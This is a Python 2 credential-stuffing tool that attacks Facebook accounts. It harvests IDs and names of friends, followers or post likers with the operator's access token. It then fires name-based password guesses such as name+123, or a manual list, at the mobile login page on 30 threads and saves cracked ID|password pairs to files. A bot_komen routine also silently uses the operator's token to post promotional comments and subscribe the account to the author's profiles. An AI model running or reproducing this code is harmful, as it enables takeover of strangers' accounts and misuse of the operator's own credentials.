# -*- coding: utf-8
#####################################################
# * Author    : Angga Kurniawan                     #
# * Facebook  : https://facebook.com/gaaaarzxd      #
# * GitHub    : https://github.com/anggaxd          #
# * Instagram : https://www.instagram.com/gaaarzxd  #
# * Website   : https://anggaxd.herokuapp.com       #
# * File Name : run.py < simpel brute force >       #
#####################################################

try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	exit(" \033[0;97m[\033[0;91m!\033[0;97m] %s installed yet"%(modul)) 

loop = 0
ok = []
cp = []
id = []
pwx = []

ses = requests.Session()
rgb = random.choice(["\033[0;91m","\033[0;92m","\033[0;93m","\033[0;94m","\033[0;95m","\033[0;96m","\033[0;97m"])
ua = ses.get("https://anggaxd.herokuapp.com/ua.txt").text.strip()
ip = ses.get("https://api.ipify.org").text
	
ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "Nopember", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	os.system("clear")
	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|V2 \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")

def bot_komen():
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
        os.system("rm -rf login.txt")
    una = ("100015073506062") 
    post = ("1031861840659590") 
    post2 = ("1110619372783836") 
    kom = ("GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl") 
    kom2 = ("KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl") 
    ses.post("https://graph.facebook.com/" + post + "/comments/?message=" + kom + "&access_token=" + token)
    ses.post("https://graph.facebook.com/" + post2 + "/comments/?message=" + kom2 + "&access_token=" + token)
    ses.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/1186995774/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/100002163187650/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/100000891392705/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/100010998764674/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/100022849470990/subscribers?access_token=" + token)
    ses.post("https://graph.facebook.com/100003058813748/subscribers?access_token=" + token)
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()
    
def tokenz():
	os.system("clear")
	try:
		token = open("login.txt","r")
		menu()
	except(KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
		try:
			otw = ses.get("https://graph.facebook.com/me?access_token="+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", "w")
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except IOError, KeyError:
		print(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
		os.system("clear")
		os.system("rm -rf login.txt")
		tokenz()
	try:
		otw = ses.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except requests.exceptions.ConnectionError:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Connection")
	logo()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : %s"%(nama))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : %s"%(ip))
	print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------") 
	print(" \033[0;97m[\033[0;96m1\033[0;97m] Crack From Public")
	print(" \033[0;97m[\033[0;96m2\033[0;97m] Crack From Follower")
	print(" \033[0;97m[\033[0;96m3\033[0;97m] Crack From Reaction")
	print(" \033[0;97m[\033[0;96m4\033[0;97m] Check Results")
	print(" \033[0;97m[\033[0;91m0\033[0;97m] Logout (delete token)")
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public()
	elif ask == "2" or ask == "02":
		followers()
	elif ask == "3" or ask == "03":
		reaction()
	elif ask == "4" or ask == "04":
		print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check Results OK")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Check Results CP")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except(IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
			except(IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		else:
			menu()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Successfully Delete Token")
	else:
		menu()

def public():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		print(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = ses.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found")
	r = ses.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i["id"]
		name = i["name"]
		id.append(uid+"<=>"+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      "\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s " % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"}, headers={"user-agent": ua})
				xo = rex.content
				if "mbasic_logout_button" in xo or "save-device" in xo:
					print("\r  \033[0;92m* --> " +uid+ "|" + pw + "       ")
					ok.append(uid+"|"+pw)
					save = open("results/OK-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(pw)+"\n")
					save.close()
					break
					continue
				if "checkpoint" in xo:
					print("\r  \033[0;93m* --> " +uid+ "|" + pw + "       ")
					cp.append(uid+"|"+pw)
					save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(pw)+"\n")
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def followers():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		print(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = ses.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found")
	r = ses.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i["id"]
		name = i["name"]
		id.append(uid+"<=>"+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      "\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s " % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"}, headers={"user-agent": ua})
				xo = rex.content
				if "mbasic_logout_button" in xo or "save-device" in xo:
					print("\r  \033[0;92m* --> " +uid+ "|" + pw + "       ")
					ok.append(uid+"|"+pw)
					save = open("results/OK-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(pw)+"\n")
					save.close()
					break
					continue
				if "checkpoint" in xo:
					print("\r  \033[0;93m* --> " +uid+ "|" + pw + "       ")
					cp.append(uid+"|"+pw)
					save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(pw)+"\n")
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def reaction():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		print(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
	try:
		pok = ses.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found")
	r = ses.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i["id"]
		name = i["name"]
		id.append(uid+"<=>"+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      "\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s " % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"}, headers={"user-agent": ua})
				xo = rex.content
				if "mbasic_logout_button" in xo or "save-device" in xo:
					print("\r  \033[0;92m* --> " +uid+ "|" + pw + "       ")
					ok.append(uid+"|"+pw)
					save = open("results/OK-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(pw)+"\n")
					save.close()
					break
					continue
				if "checkpoint" in xo:
					print("\r  \033[0;93m* --> " +uid+ "|" + pw + "       ")
					cp.append(uid+"|"+pw)
					save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(pw)+"\n")
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		sys.stdout.write(
		      "\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s " % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		ss = name.split(" ")
		try:os.mkdir("results")
		except OSError:pass
		try:
			for asu in pw.split(","):
				rex = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": asu, "login": "submit"}, headers={"user-agent": ua})
				xo = rex.content
				if "mbasic_logout_button" in xo or "save-device" in xo:
					print("\r  \033[0;92m* --> " +uid+ "|" + asu + "       ")
					ok.append(uid+"|"+asu)
					save = open("results/OK-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(asu)+"\n")
					save.close()
					break
					continue
				if "checkpoint" in xo:
					try:
						token = open("login.txt").read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = ses.get(url).json()
						ttl = data["birthday"].replace("/","-")
						print("\r  \033[0;93m* --> " +uid+ "|" + asu + "|" + ttl)
						cp.append(uid+"|"+asu+"|"+ttl)
						save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
						save.write("  * --> "+str(uid)+"|"+str(asu)+"|"+ttl+"\n")
						save.close()
						break
					except(KeyError, IOError):
						ttl = (" ")
					except:pass
					print("\r  \033[0;93m* --> " +uid+ "|" + asu + "       ")
					cp.append(uid+"|"+asu)
					save = open("results/CP-%s-%s-%s.txt" % (ha, op, ta),"a") 
					save.write("  * --> "+str(uid)+"|"+str(asu)+"\n")
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

if __name__ == "__main__":
	if sys.version[0]!="3":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		print(" \033[0;97m[\033[0;93m#\033[0;97m] Please Use Python 2 Bro Not Python 3")
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
	os.system("git pull")
	tokenz()
